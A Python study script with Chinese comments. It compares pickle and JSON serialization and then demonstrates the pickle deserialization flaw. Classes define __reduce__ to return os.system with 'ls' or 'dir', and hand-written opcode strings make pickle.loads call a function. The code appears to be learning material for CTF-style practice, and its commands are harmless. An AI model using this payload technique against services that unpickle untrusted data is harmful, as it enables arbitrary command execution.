import functools
import json
import os
import pickle

d = dict(name='PureLov3', create_time='2022.7.7', id=16)
print(d)
print()
pdmp = pickle.dumps(d)
print(pdmp)
dd = pickle.loads(pdmp)
print(dd)
print(d == dd)  # True
print()
jdmp = json.dumps(d)
print(jdmp)
dd = json.loads(jdmp)
print(dd)
print(d == dd)

print('############### 反序列化漏洞 ##################')


# decorator
def log(msg):
    def rtnWF(f):
        @functools.wraps(f)
        def WF(*args, **kwargs):
            print('[Decorator] Calling __' + msg + '__()')
            return f(*args, **kwargs)

        return WF

    return rtnWF


class Me(object):
    @log('init')
    def __init__(self, s):
        self.__name = s

    def sayHello(self):
        print('Hello', self.__name)

    @log('reduce')      # 通过添加decorator可知,当调用pickle.dumps时会调用__reduce__()
    def __reduce__(self):
        return (os.system,('ls',))                 # 必选两个 一个callable对象（如果要return自己的话就必须定义__call__），一个作为参数的tuple


m = Me('PureLov3')

# pdmp = pickle.dumps(m)
# print(pdmp.decode('utf-8', errors='ignore'))
# print(pdmp)
# mm = pickle.loads(pdmp)
# mm.sayHello()
# print(m == mm)  # 好像自定义对象是False
# pickle.loads(pdmp).sayHello()
#
# for i in range(6):
#     print(pickle.dumps(m, protocol=i))



# print(pickle.dumps(m,protocol=0))   # 得到b'ccopy_reg\n_reconstructor\np0\n(c__main__\nMe\np1\nc__builtin__\nobject\np2\nNtp3\nRp4\n(dp5\nV_Me__name\np6\nVPureLov3\np7\nsb.'
# print('ccopy_reg\n_reconstructor\np0\n(c__main__\nMe\np1\nc__builtin__\nobject\np2\nNtp3\nRp4\n(dp5\nV_Me__name\np6\nVPureLov3\np7\nsb.')
print()
print(pickle.dumps(123,protocol=0))
print(pickle.dumps('abc',protocol=0))
print(pickle.loads(pickle.dumps('abc',protocol=0)))



print()
s = b'I16\n.'   # 16
s2 = b"(S'purelove'\nI16\nl."   # ['purelove', 16]
s3 = b"Vfo\u006f\n."    # foo
# print(pickle.loads(s2))


# 所以本质就是把可调用对象压入栈，然后组装出一个元组作为参数 ，最后直接R一下进行execute
sp = b"cbuiltins\nprint\n(S'PureLov3 with id'\nI16\ntR.sdfghjkl" # .后直接丢弃
pickle.loads(sp)    # return None

print(pickle.dumps(m))

# __reduce__的作用是在生成payload的时候，可以不用手写，在return里指定callable对象和参数，之后直接dump出来就行
# 暂时就这样吧 没有题目全白瞎
print()
class Payload(object):
    def __reduce__(self):
        return (os.system,('dir',))

print(pickle.dumps(Payload(),protocol=0))
pickle.loads(pickle.dumps(Payload()))   # 只要有权限就能任意命令执行，比如这里是列出当前目录的文件